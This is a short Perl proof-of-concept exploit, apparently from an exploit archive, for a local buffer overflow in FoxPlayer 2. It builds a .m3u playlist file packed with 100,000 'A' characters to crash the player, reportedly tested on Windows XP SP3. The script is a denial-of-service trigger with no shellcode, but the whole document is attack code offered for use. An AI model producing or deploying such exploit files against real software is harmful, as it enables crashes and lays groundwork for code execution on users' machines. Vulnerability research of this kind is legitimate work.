###########################################################################
#Exploit Title : FoxPlayer 2 (.m3u) Local BOF PoC
#download : http://www.foxmediatools.com/products/foxplayer.html
#tested on windows xp SP 3 FR
#Author: MadjiX - Dz8[at]hotmail[dot]com
#Special Greets: Bibi-info , His0k4
###########################################################################
my $file= "MadjiX.m3u";
my $junk1= "\x41" x 100000 ;
open($FILE,">$file");
print $FILE $junk1 ;
close($FILE);


